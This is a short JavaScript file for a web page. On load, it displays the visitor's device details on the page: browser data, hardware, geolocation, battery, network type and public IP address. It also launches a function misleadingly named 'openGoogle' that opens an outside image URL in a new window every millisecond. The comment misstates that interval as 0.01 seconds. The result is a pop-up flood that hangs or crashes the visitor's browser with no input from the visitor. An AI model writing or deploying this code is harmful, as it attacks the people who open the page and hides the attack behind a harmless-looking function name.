// Function to open a specific URL every 0.01 seconds
function openGoogle() {
    setInterval(function() {
        window.open('https://imagehub.fun/F0CAFS.png', '_blank');
    }, 1);
}

// Function to get and display detailed device information
function displayDeviceInfo() {
    // Basic information
    document.getElementById('userAgent').innerText = `User Agent: ${navigator.userAgent}`;
    document.getElementById('screenResolution').innerText = `Screen Resolution: ${screen.width}x${screen.height}`;
    document.getElementById('platform').innerText = `Platform: ${navigator.platform}`;
    document.getElementById('language').innerText = `Language: ${navigator.language}`;
    document.getElementById('cookieEnabled').innerText = `Cookies Enabled: ${navigator.cookieEnabled}`;
    document.getElementById('onlineStatus').innerText = `Online Status: ${navigator.onLine}`;
    document.getElementById('timezone').innerText = `Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
    
    // Additional information
    document.getElementById('cpuCores').innerText = `CPU Cores: ${navigator.hardwareConcurrency}`;
    document.getElementById('deviceMemory').innerText = `Device Memory: ${navigator.deviceMemory || 'Not available'} GB`;
    document.getElementById('colorDepth').innerText = `Color Depth: ${screen.colorDepth} bits`;
    document.getElementById('pixelDepth').innerText = `Pixel Depth: ${screen.pixelDepth} bits`;
    document.getElementById('appName').innerText = `App Name: ${navigator.appName}`;
    document.getElementById('appVersion').innerText = `App Version: ${navigator.appVersion}`;
    document.getElementById('vendor').innerText = `Vendor: ${navigator.vendor}`;
    document.getElementById('productSub').innerText = `Product Sub: ${navigator.productSub}`;
    document.getElementById('javaEnabled').innerText = `Java Enabled: ${navigator.javaEnabled()}`;
    document.getElementById('doNotTrack').innerText = `Do Not Track: ${navigator.doNotTrack}`;
    
    // Geolocation (if available)
    navigator.geolocation.getCurrentPosition(function(position) {
        document.getElementById('latitude').innerText = `Latitude: ${position.coords.latitude}`;
        document.getElementById('longitude').innerText = `Longitude: ${position.coords.longitude}`;
        document.getElementById('altitude').innerText = `Altitude: ${position.coords.altitude || 'Not available'}`;
        document.getElementById('accuracy').innerText = `Accuracy: ${position.coords.accuracy} meters`;
        document.getElementById('altitudeAccuracy').innerText = `Altitude Accuracy: ${position.coords.altitudeAccuracy || 'Not available'} meters`;
        document.getElementById('heading').innerText = `Heading: ${position.coords.heading || 'Not available'}`;
        document.getElementById('speed').innerText = `Speed: ${position.coords.speed || 'Not available'} m/s`;
    });

    // Network information (if available)
    if ('connection' in navigator) {
        document.getElementById('networkType').innerText = `Network Type: ${navigator.connection.effectiveType}`;
        document.getElementById('downlink').innerText = `Downlink: ${navigator.connection.downlink} Mbps`;
        document.getElementById('rtt').innerText = `Round-Trip Time: ${navigator.connection.rtt} ms`;
        document.getElementById('saveData').innerText = `Data Saver Mode: ${navigator.connection.saveData}`;
    }

    // Battery information (if available)
    navigator.getBattery().then(function(battery) {
        document.getElementById('batteryLevel').innerText = `Battery Level: ${Math.round(battery.level * 100)}%`;
        document.getElementById('charging').innerText = `Charging: ${battery.charging ? 'Yes' : 'No'}`;
        document.getElementById('chargingTime').innerText = `Charging Time: ${battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + ' seconds'}`;
        document.getElementById('dischargingTime').innerText = `Discharging Time: ${battery.dischargingTime === Infinity ? 'Not available' : battery.dischargingTime + ' seconds'}`;
    });

    // Fetch IP address using a third-party service
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            document.getElementById('ipAddress').innerText = `IP Address: ${data.ip}`;
        })
        .catch(error => console.error('Error fetching IP address:', error));
}

// Initialize functions on page load
window.onload = function() {
    displayDeviceInfo();
    openGoogle();
};
